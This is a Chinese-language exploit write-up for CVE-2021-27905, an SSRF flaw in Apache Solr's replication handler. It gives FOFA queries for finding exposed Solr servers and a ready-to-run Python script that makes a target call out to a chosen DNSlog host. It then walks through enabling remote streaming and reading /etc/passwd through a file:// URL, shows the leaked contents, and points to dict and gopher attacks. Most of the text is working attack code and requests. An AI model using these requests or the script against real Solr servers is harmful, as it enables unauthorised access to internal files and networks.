

# CVE-2021-27905 | Apache Solr <= 8.8.1 存在SSRF漏洞





## 0x00 漏洞说明



在 Apache Solr <=8.8.2 中的 `ReplicationHandler`（通常注册在 Solr core 下的 `/replication` ）有一个 `masterUrl` （也称为 `leaderUrl` 别名）参数，用于指定将另一个 Solr core上的 `ReplicationHandler` 参数的索引数据复制到本地 `core` ，由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意语句，最后造成SSRF攻击。



## 0x01 影响版本



- <= Apache Solr 8.8.2



## 0x02 漏洞成因



1. 在Apache Solr 在进行 replication 操作时对传入的 masterUrl 参数 Solr 未对其做白名单过滤。
2. Solr 配置为主从模式，且为从(slave)服务器 (条件)



## 0x03 漏洞指纹



fofa:

```
app="Apache-solr"
title="Solr Admin"
```





## 0x04 POC & EXP



!FILENAME poc.py

```python
# CVE-2021-27905
# Apache solr ssrf

import requests
import urllib3
import json
import sys, getopt
urllib3.disable_warnings()




def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      Apache Solr SSRF漏洞      ---------------]")
    print("[--------               CVE-2021-27905               ----------]")
    print("[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]")
    print("[--------              Author:Henry4E36            ------------]")
    print("[-------------------------------------------------------------]")

def commit():
    url = ""
    try:
        opt, agrs = getopt.getopt(sys.argv[1:], "hu:d:", ["help", "url=","dnslog="])
        for op, value in opt:
            if op == "-h" or op == "--help":
                print("""
            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)
            [-]   Options:
                     -h or --help      :   方法说明
                     -u or --url       :   站点URL地址
                     -d or --dnslog    :   DnsLog
                """)
                sys.exit(0)
            elif op == "-u" or op == "--url=":
                url = value
            elif op == "-d" or op == "--dnslog=":
                dnslog = value
            else:
                print("[-] 参数有误! eg:>>> python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog")
                sys.exit()
        return url, dnslog

    except Exception as e:
        print("[-] 参数有误! eg:>>> python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog")
        sys.exit(0)

def target_core(url):
    target_url = url + "/solr/admin/cores?indexInfo=false&wt=json"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
    }
    try:
        res = requests.get(url=target_url,headers=headers,verify=False,timeout=5)
        core = list(json.loads(res.text)["status"])[0]
        return core
    except Exception as e:
        print(f"[!]  目标系统: {url} 出现意外！\n ",e)

def ssrf(core,dnslog):
    target_url = url + f"/solr/{core}/replication/?command=fetchindex&masterUrl=http://{dnslog}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
    }
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
        status = json.loads(res.text)["status"]
        if res.status_code == 200 and status == "OK":
            print(f"[!]  \033[31m目标系统: {url} 可能存在SSRF漏洞，请检查DNSLog响应！\033[0m")
        else:
            print(f"[0]  目标系统: {url} 不存在SSRF漏洞")

    except Exception as e:
        print(f"[!]  目标系统: {url} 出现意外！\n ", e)


if __name__ == "__main__":
    title()
    url ,dnslog = commit()
    core = target_core(url)
    ssrf(core,dnslog)
```





## 0x05 详细利用过程



首先，查看core_name值

```json
http://xxx:8983/solr/admin/cores?indexInfo=false&wt=json
```



其Response如下

```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 0
    },
    "initFailures": {},
    "status": {
        "demo": {
            "name": "demo", //此处为core名称
            "instanceDir": "/var/solr/data/demo",
            "dataDir": "/var/solr/data/demo/data/",
            "config": "solrconfig.xml",
            "schema": "managed-schema",
            "startTime": "2022-03-19T21:42:18.968Z",
            "uptime": 77968
        }
    }
}
```







通过向solr API 发送 POST请求以设置 `enableRemoteStreaming`  为 `true` (URL路劲中包含core名称)

```json
POST:http://ip:8983/solr/demo/config


body:
{
    "set-property" :
    {
        "requestDispatcher.requestParsers.enableRemoteStreaming":true
    }
}
```





发送GET请求，构造恶意配置集以利用file://伪协议读取文件

```json
http://xxx:8983/solr/www/debug/dump?stream.url=file:///etc/passwd&param=ContentStreams
```



响应内容:

```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 1,
        "handler": "org.apache.solr.handler.DumpRequestHandler",
        "params": {
            "param": "ContentStreams",
            "stream.url": "file:///etc/passwd"
        }
    },
    "params": {
        "stream.url": "file:///etc/passwd",
        "echoHandler": "true",
        "param": "ContentStreams",
        "echoParams": "explicit"
    },
    "streams": [
        {
            "name": null,
            "sourceInfo": "url",
            "size": null,
            "contentType": null,
            "stream": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsolr:x:8983:8983::/home/solr:/bin/sh\n"
        }
    ],
    "context": {
        "webapp": "/solr",
        "path": "/debug/dump",
        "httpMethod": "GET"
    }
}
```





## 0X06 进阶利用思路：



**除此之外，还可以使用其他SSRF伪协议进行攻击，例如dict、gopher等**



https[:]//www.sqlsec.com/2021/05/ssrf.html#toc-heading-1



## 0x07 扩展链接



[Solr 参考指南](https://solr.apache.org/guide/6_6/index-replication.html)



[NVD CVE-2021-27905 报告](https://nvd.nist.gov/vuln/detail/CVE-2021-27905)



[手把手带你用 SSRF 打穿内网](https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-1)



## 0x10 联系方式



作者 : BitWiki支持团队
